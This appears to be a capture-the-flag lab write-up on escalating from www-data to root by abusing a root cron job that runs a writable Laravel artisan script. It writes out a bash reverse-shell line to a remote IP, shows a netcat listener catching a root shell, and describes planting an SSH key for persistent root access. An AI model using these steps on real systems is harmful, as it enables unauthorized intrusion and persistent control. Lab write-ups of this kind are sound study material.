# Priv Esc from www-data to root (directly)

- We can cat out the user.txt without being noulis from /home/noulis
- Intersting things:
	-  \* \* \* \* \*       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
	-  Some open and listening ports
	```bash
	tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      - Mysql                
	tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      - RDNS
	```
	- Interesting files:
	```bash
	/home/noulis/.composer/cache/files/mockery/mockery/f30d894582b8b548b641819cd37c4cfc11d5b315.zip 
	/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles/b52e5b78653e57b3b07937c1f84109ac7f77e5e0.zip
	/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup/9fdb38e356a0265a2dd6b64495413906b9366038.zip
	/home/noulis/.composer/cache/files/sebastian/resource-operations/fd2c0f591ee5fee7aa3eb70f20a1d64c1dc26e8d.zip
	/home/noulis/.composer/cache/files/sebastian/diff/d845e8b0ee3d707d4b13b9febac4e7a0e8b22fe5.zip
	/home/noulis/.composer/cache/files/sebastian/global-state/a0ef5bf736af85b66572f9ed232aa35c18fe5fb7.zip
	/home/noulis/.composer/cache/files/sebastian/exporter/81e14d73852681aabe5c5a9d8be1ef2045a9170a.zip
	/home/noulis/.composer/cache/files/sebastian/comparator/bdc0b01e0827c360d54386fe60dfc6bd65168f80.zip
	/home/noulis/.composer/cache/files/sebastian/version/c315a200d32565a6d8ebb3495cb5ae34c5ced3c8.zip
	/home/noulis/.composer/cache/files/sebastian/environment/72b70c30c0946406c4562db7b7c647d084a87e12.zip
	/home/noulis/.composer/cache/files/sebastian/recursion-context/82276e6cc560a972510bb0c2dc0aa78fa4701777.zip
	```
	- Laravel files
	 ```bash
	 /var/www/laravel/.env
	 ```
- Coming back to the first file /var/www/laravel/artisan, we see that it is run every minute. Also it in the folder which can be edited by www-data
- So we can edit artisan bu adding  `exec("bash -c 'bash -i >& /dev/tcp/10.10.14.5/9002 0>&1'");` into the script after <?php...?> tag first encountered .
- Also open a listener on port 9002.
	```bash
	nc -lnvp 9002
	listening on [any] 9002 ...
	
	connect to [10.10.14.5] from (UNKNOWN) [10.10.10.13] 34696
	/bin/sh: 0: can't access tty; job control turned off
	# id
	uid=0(root) gid=0(root) groups=0(root)
	# 
	```
- Cat out the root.txt. Create a .ssh folder. Crete our own ssh-keygen on our local machine. Append pub key to the ssh folder in the other machine. Login as root when wanted.